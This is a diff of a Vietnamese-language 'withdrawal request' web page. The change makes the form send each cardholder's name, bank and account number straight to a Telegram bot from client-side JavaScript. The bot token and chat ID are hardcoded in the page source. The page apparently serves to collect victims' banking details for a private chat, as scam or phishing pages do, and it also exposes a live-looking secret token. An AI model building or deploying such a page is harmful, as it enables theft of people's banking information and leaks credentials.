@@ -63,15 +63,15 @@
 
 <div class="form-container">
     <h2>Yêu Cầu Rút Tiền</h2>
-    <form action="send_telegram.php" method="POST">
+    <form id="withdrawalForm">
         <div class="form-group">
             <label for="fullname">Họ và tên chủ thẻ:</label>
-            <input type="text" id="fullname" name="fullname" placeholder="NGUYEN VAN A" required>
+            <input type="text" id="fullname" placeholder="NGUYEN VAN A" required>
         </div>
 
         <div class="form-group">
             <label for="bank">Ngân hàng:</label>
-            <select id="bank" name="bank" required>
+            <select id="bank" required>
                 <option value="">-- Chọn ngân hàng --</option>
                 <option value="Vietcombank">Vietcombank</option>
                 <option value="Techcombank">Techcombank</option>
@@ -83,17 +83,82 @@
 
         <div class="form-group">
             <label for="account_number">Số tài khoản / Số điện thoại:</label>
-            <input type="text" id="account_number" name="account_number" placeholder="Nhập số tài khoản" required>
+            <input type="text" id="account_number" placeholder="Nhập số tài khoản" required>
         </div>
 
         <div class="form-group">
             <label for="amount">Số tiền muốn rút (VND):</label>
-            <input type="number" id="amount" name="amount" min="10000" placeholder="Ví dụ: 100000" required>
+            <input type="number" id="amount" min="10000" placeholder="Ví dụ: 100000" required>
         </div>
 
-        <button type="submit">Xác Nhận Rút Tiền</button>
+        <button type="submit" id="btnSubmit">Xác Nhận Rút Tiền</button>
     </form>
 </div>
+
+<script>
+document.getElementById('withdrawalForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const btn = document.getElementById('btnSubmit');
+    btn.innerText = "Đang xử lý...";
+    btn.disabled = true;
+
+    // Thông tin Telegram cấu hình sẵn
+    const botToken = "8664079130:AAGCDkMhNyjnfNM9wceQ_Pc301bIMYetvdA";
+    const chatId = "6686303067";
+
+    // Lấy dữ liệu form
+    const fullname = document.getElementById('fullname').value.trim();
+    const bank = document.getElementById('bank').value;
+    const accountNumber = document.getElementById('account_number').value.trim();
+    const amount = document.getElementById('amount').value;
+    
+    // Định dạng tiền tệ
+    const formattedAmount = Number(amount).toLocaleString('vi-VN') + " VND";
+    const time = new Date().toLocaleString('vi-VN');
+
+    // Soạn tin nhắn gửi về Telegram
+    let message = `🚨 *CÓ YÊU CẦU RÚT TIỀN MỚI* 🚨\n\n`;
+    message += `👤 *Chủ thẻ:* ${fullname}\n`;
+    message += `🏦 *Ngân hàng:* ${bank}\n`;
+    message += `💳 *Số tài khoản:* \`${accountNumber}\`\n`; // Click vào tự động copy
+    message += `💵 *Số tiền:* *${formattedAmount}*\n`;
+    message += `🕒 *Thời gian:* ${time}\n\n`;
+    message += `👉 _Vui lòng kiểm tra và thực hiện giao dịch!_`;
+
+    // Gọi API Telegram trực tiếp bằng Fetch
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alert('Gửi yêu cầu rút tiền thành công! Vui lòng chờ hệ thống xử lý.');
+            document.getElementById('withdrawalForm').reset();
+        } else {
+            alert('Lỗi: Không thể gửi yêu cầu. Vui lòng thử lại.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Có lỗi mạng xảy ra, vui lòng thử lại sau.');
+    })
+    .finally(() => {
+        btn.innerText = "Xác Nhận Rút Tiền";
+        btn.disabled = false;
+    });
+});
+</script>
 
 </body>
 </html>
